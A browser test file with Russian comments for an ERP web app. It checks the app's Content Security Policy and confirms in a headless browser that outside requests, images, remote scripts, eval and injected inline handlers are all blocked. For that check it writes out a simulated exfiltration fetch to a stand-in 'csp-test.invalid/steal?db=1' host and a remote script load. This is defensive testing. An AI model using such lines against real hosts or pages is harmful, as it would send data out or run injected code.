/* Политика содержимого (CSP, план «до 10», этап 3, 09.11.2026): обе сборки
   несут политику build/build.js; страница не может отправить данные на
   чужой адрес (запрос, картинка, форма), подгрузить чужой код или eval.
   Что ERP сама не упирается в запрет, проверяет каждый тест (test/run.js,
   cspViolations). Здесь запреты ожидаемые: window.cspExpected — в общий
   счёт они не идут. Встроенного кода в script-src нет ('unsafe-inline' убран,
   задание «CSP без inline», 14.11.2026): свой встроенный <script> страницы
   пропускает его хеш, который кладёт сборка; чужой — обработчик onclick или
   <script>, вставленный в страницу, — не выполняется. */
const fs = require('fs');
const path = require('path');

module.exports = async function ({ page, eq }) {
  console.log('csp');
  const ROOT = path.resolve(__dirname, '..');
  /* Политика страницы и её встроенные скрипты (без src): политика — та, что даёт сборка для этого текста. */
  const pageOf = f => { const html = fs.readFileSync(path.join(ROOT, f), 'utf8'), m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html);
    return { csp: m ? m[1] : '', inline: [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(x => x[1]) }; };
  /* Собранный файл в ветке старый (его пересобирает CI) — сверяется в прогоне по нему. */
  const { cspWithScript } = require('../build/build.js'), webPage = pageOf('src/index.html'), web = webPage.csp, distPage = process.env.TARGET === 'dist' ? pageOf('dist/GLASS_ERP.html') : webPage;
  const rule = name => (web.split(';').map(x => x.trim()).find(x => x.startsWith(name + ' ')) || '').split(/\s+/).slice(1);
  const own = p => ({ scripts: p.inline.length, csp: p.inline.length === 1 && p.csp === cspWithScript(p.inline[0]) });
  eq('CSP: политика сборки (build/build.js) с хешем своего единственного встроенного <script> — в странице по модулям и в собранном файле', { web: own(webPage), dist: own(distPage) }, { web: { scripts: 1, csp: true }, dist: { scripts: 1, csp: true } });
  eq('CSP: script-src без встроенного кода и eval — только свой сайт, хеш своего скрипта и Google Maps; стили style="…" можно', {
    script: rule('script-src').map(x => /^'sha256-[A-Za-z0-9+/]+=*'$/.test(x) ? 'hash' : x), style: rule('style-src')
  }, { script: ["'self'", 'hash', 'https://maps.googleapis.com', 'https://maps.gstatic.com'], style: ["'self'", "'unsafe-inline'"] });
  eq('CSP: сеть — только свой сайт, Supabase и Google Maps; eval запрещён; без object, base и чужих форм', {
    connect: rule('connect-src'), eval: /unsafe-eval/.test(web), object: rule('object-src'), base: rule('base-uri'), form: rule('form-action'), def: rule('default-src')
  }, { connect: ["'self'", 'https://*.supabase.co', 'https://maps.googleapis.com'], eval: false, object: ["'none'"], base: ["'none'"], form: ["'self'"], def: ["'self'"] });

  const t = await page();
  const got = await t.p.evaluate(async () => {
    window.cspExpected = true;const v = [];document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective.replace(/-elem$/, '')));
    let sent = 'sent';try { await fetch('https://csp-test.invalid/steal?db=1'); } catch (e) { sent = 'blocked'; }
    await new Promise(ok => { const i = new Image();i.onerror = ok;i.onload = ok;i.src = 'https://csp-test.invalid/p.gif';setTimeout(ok, 1000); });
    window.cspRan = false;const s = document.createElement('script');s.src = 'https://csp-test.invalid/x.js';document.head.appendChild(s);
    let ev = 'ran';try { eval('1'); } catch (e) { ev = 'blocked'; }
    await new Promise(r => setTimeout(r, 300));
    return { sent, ev, seen: [...new Set(v)].sort() };
  });
  eq('CSP: чужой адрес — запрос, картинка, скрипт и eval не проходят', got, { sent: 'blocked', ev: 'blocked', seen: ['connect-src', 'img-src', 'script-src'] });
  /* Встроенный код, попавший в страницу (текст из базы без esc): обработчик в разметке и <script> без хеша. */
  const inl = await t.p.evaluate(async () => {
    window.cspExpected = true;const v = [];document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective));
    window.cspAttr = 'blocked';window.cspElem = 'blocked';
    const box = document.createElement('div');box.innerHTML = '<button type="button" onclick="window.cspAttr=\'ran\'">x</button>';document.body.appendChild(box);box.firstChild.click();
    const s = document.createElement('script');s.textContent = "window.cspElem='ran'";document.body.appendChild(s);
    await new Promise(r => setTimeout(r, 300));box.remove();s.remove();
    return { attr: window.cspAttr, elem: window.cspElem, seen: [...new Set(v)].sort() };
  });
  eq('CSP: встроенный обработчик onclick и встроенный <script> без хеша не выполняются', inl, { attr: 'blocked', elem: 'blocked', seen: ['script-src-attr', 'script-src-elem'] });
  await t.c.close();
};
